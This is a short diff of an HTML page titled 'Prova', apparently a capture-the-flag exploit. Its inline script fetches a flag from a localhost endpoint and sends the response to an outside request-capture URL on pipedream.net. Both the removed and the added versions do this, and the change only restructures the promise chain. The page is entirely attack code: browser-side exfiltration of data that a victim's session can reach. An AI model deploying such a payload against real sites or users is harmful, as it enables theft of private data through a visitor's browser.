@@ -2,11 +2,11 @@
   <head>
     <title>Prova</title>
     <script>
-      fetch("http://localhost/get_flag.php").then(response => {
-        fetch("https://enahomwjmoi9k.x.pipedream.net/" + response).then(response1 => {
-          console.log(response1)
-        }).catch(error => console.log("Si è verificato un errore!")) 
-      }).catch(error => console.log("Si è verificato un errore!"))
+      fetch("http://localhost/get_flag.php").then(r => {
+        if (r.ok) {
+          return r.json();
+        }
+      }).then(d => fetch("https://enahomwjmoi9k.x.pipedream.net/" + d).then(r2 => console.log(r2)));
     </script>
   </head>
 </html>
